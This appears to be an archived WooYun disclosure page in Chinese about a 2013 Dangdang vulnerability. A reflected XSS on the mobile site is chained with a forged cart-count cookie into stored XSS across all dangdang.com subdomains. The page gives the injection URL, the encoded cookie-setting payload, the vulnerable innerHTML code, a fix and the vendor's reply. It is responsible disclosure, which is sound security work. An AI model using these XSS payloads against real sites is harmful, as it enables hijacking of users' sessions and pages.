@@ -1,0 +1,201 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		当当网：二级域反射XSS变身所有域下存储XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		当当网：二级域反射XSS变身所有域下存储XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/八折">八折</a> 
+</li><li>提交时间：		2013-01-19 12:54</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-08：	细节向普通白帽子公开<br/>
+									2013-02-18：	细节向实习白帽子公开<br/>
+									2013-03-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">1.二级甚至三级域下的反射XSS是不是很鸡肋?<br />
+2.只能XX自己的XSS是不是更鸡肋?(如更改user-agent可弹框这种,你懂的)<br />
+1+2=所有域下存储XSS.<br />
+只是为了好玩～～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.登录当当后，页面顶部的用户昵称、购物车数量等是js从COOKIE中读出来加载的，伪造COOKIE即可形成存储型XSS(几乎所有域下，即使用户不登录或退出，都不影响COOKIE里购物车数量，本例XSS有效至2020年，看官按口味可自行调整).<br />
+<br />
+</p><p class="detail"><a href="../images/191233553bdf3869fee351853f2c45aa146c69e8.png" target="_blank"><img src="../images/191233553bdf3869fee351853f2c45aa146c69e8.png" alt="QQ20130119-1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2.找到手机当当下一处反射XSS，加载更改COOKIE中购物车数量的js代码。<br />
+<br />
+http://m.dangdang.com/touch/leavemsg.php?sid=3d41%22%3E%3Cscript%20src=http://localhost/test/dd.js%3E%3C/script%3E%3C%22<br />
+<br />
+dd.js代码：<br />
+<br />
+</p><pre><code>document.cookie = &quot;cart_items_count=%u003c%u0069%u006d%u0067%u0020%u0073%u0072%u0063%u003d%u0031%u0020%u006f%u006e%u0065%u0072%u0072%u006f%u0072%u003d%u0061%u006c%u0065%u0072%u0074%u0028%u0031%u0029%u003e;Domain=dangdang.com;Path=/;expires=&quot;+new Date().toGMTString().replace(&#039;2013&#039;,&#039;2020&#039;);<br />
+location.href=&quot;http://www.dangdang.com&quot;;</code></pre><p class='detail'><br />
+<br />
+当当解析COOKIE的js部分：<br />
+<br />
+http://www.dangdang.com/Found/pagetop_2012.js<br />
+<br />
+</p><pre><code>if(usernick==&quot;&quot;){<br />
+        xinshou = &quot;&lt;a name=\&quot;dl\&quot; href=\&quot;java&quot;+&quot;scr&quot;+&quot;ipt:PageTopLogIn();\&quot; target=\&quot;_self\&quot; class=\&quot;login_link\&quot;&gt;登录&lt;/a&gt;&lt;a name=\&quot;zc\&quot; href=\&quot;java&quot;+&quot;scr&quot;+&quot;ipt:PageTopRegist();\&quot; target=\&quot;_self\&quot; class=\&quot;login_link\&quot;&gt;免费注册&lt;/a&gt;&quot;;<br />
+    }else{<br />
+        chakanlk = &quot; [&lt;a name=\&quot;tc\&quot; href=\&quot;java&quot;+&quot;scr&quot;+&quot;ipt:PageTopSignOut();\&quot; target=\&quot;_self\&quot;&gt;退出登录&lt;/a&gt;]&quot;;<br />
+        xinshou = &quot;&quot;;<br />
+        var cartItemsCount=getCookie_one(&quot;cart_items_count&quot;,&quot;&quot;);<br />
+        if(cartItemsCount!=null&amp;&amp;cartItemsCount.length&gt;0&amp;&amp;cartItemsCount!=&quot;undefined&quot;)<br />
+        {<br />
+            var cic=document.getElementById(&quot;cart_items_count&quot;);<br />
+            if(cic!=&#039;&#039;){<br />
+                cic.innerHTML=&quot;(&quot;+cartItemsCount+&quot;)&quot;;  //这位置，读出COOKIE里的值直接输出在了页面上，造成XSS<br />
+            }<br />
+        }<br />
+    }</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">视频带感～～<br />
+<br />
+<embed src="http://player.youku.com/player.php/sid/XNTAzOTQxNTAw/v.swf" type="application/x-shockwave-flash" allowscriptaccess="never" allowfullscreen="true" wmode="opaque" width="480" height="370"></embed><br />
+<br />
+密码: ddxss </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">cic.innerHTML=&quot;(&quot;+cartItemsCount+&quot;)&quot;; 及其它相关位置再次过滤，或不从COOKIE里读取 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/八折" title="八折">八折</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017527" title="当当网：二级域反射XSS变身所有域下存储XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-01-19 13:42</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢。我们会尽快修补。多谢八折洞主，希望有机会到当当购物，争取给你打个“八折”。  ：）</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17527";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
